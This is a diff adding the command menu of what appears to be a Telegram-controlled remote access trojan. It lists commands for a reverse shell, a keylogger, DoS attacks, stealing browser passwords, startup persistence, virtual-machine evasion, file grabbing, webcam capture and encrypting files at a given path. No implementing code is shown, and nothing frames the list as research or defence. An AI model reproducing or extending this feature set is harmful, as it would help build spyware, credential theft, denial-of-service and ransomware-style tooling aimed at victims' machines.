@@ -1,0 +1,35 @@
+start - Start the bot and get system notification
+help - Show all available commands
+reverse <host> <port> - Start reverse shell
+put <file_path> - Upload file to Telegram
+get <file_name> - Download file from computer
+run <python_code> - Execute Python code
+screenshot - Take screenshot
+keylogger <start/stop> - Control keylogger
+dos <target> <port> <duration> - Launch DoS attack
+schedule <command> <delay> - Schedule a task
+stop - Stop the bot
+jumpscare [duration] - Trigger jumpscare with optional duration
+show <filename> - Show an image/video file on screen
+grab <path> - Grab files from the system
+steal - Steal browser passwords
+persist - Add to startup
+antivm - Check for virtual environment
+shell <command> - Execute shell command
+browse <path> - Browse files and folders
+sysinfo - Get detailed system information
+processes - List running processes
+kill <PID> - Kill a process by PID
+webcam - Capture image from webcam
+record_screen <duration> - Record screen for specified duration
+lock - Lock the computer
+unlock - Unlock the computer
+block <url> - Block a website
+unblock <url> - Unblock a website
+encrypt <path> - Encrypt files in path
+decrypt <path> - Decrypt files in path
+message <text> - Display a message on screen
+sound - Play a system sound
+bluetooth - Bluetooth control (placeholder)
+network - Scan local network
+geolocate - Get geolocation based on IP
